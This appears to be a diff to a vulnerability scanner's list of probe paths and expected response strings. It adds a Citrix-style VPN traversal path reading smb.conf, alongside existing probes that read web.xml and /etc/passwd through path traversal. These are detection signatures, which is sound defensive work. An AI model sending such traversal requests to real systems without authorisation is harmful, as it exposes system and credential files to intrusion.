@@ -19,3 +19,4 @@
 '/html/js/editor/editor.jsp?editorImpl=../../../WEB-INF/web.xml?' '<?xml version="1.0"?>'
 '/Trace.axd' 'Application Trace'
 '/tmui/login.jsp/../tmui/locallb/workspace/fileRead.jspfileName=/etc/passwd' 'root:x'
+'/vpn/../vpns/cfg/smb.conf' '[global]'
